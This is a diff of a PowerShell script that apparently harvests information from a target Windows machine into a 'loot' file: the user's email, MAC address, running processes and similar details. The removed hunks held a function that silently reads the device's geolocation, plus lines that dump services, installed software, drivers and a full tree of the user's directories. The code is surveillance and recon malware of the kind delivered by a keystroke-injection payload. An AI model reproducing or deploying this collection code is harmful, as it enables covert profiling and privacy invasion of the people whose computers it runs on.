@@ -43,33 +43,6 @@ function Get-email {
 
 $EM = Get-email
 
-#------------------------------------------------------------------------------------------------------------------------------------
-
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
-}
-
-$GL = Get-GeoLocation
 
 ############################################################################################################################################################
 
@@ -295,24 +268,6 @@ Computers MAC address: " + $MAC >> $FileName
 "Current running process: 
 =================================================================="+ ($process| Out-String) >> $FileName
 
-"Services: 
-=================================================================="+ ($service| Out-String) >> $FileName
-
-"Installed software:
-=================================================================="+ ($software| Out-String) >> $FileName
-
-"Installed drivers:
-=================================================================="+ ($drivers| Out-String) >> $FileName
-
-"Installed videocards:
-==================================================================" + ($videocard| Out-String) >> $FileName
-
-
-############################################################################################################################################################
-
-# Recon all User Directories
-#tree $Env:userprofile /a /f | Out-File -FilePath $Env:tmp\j-loot\tree.txt
-tree $Env:userprofile /a /f >> $FileName
 
 ############################################################################################################################################################
 
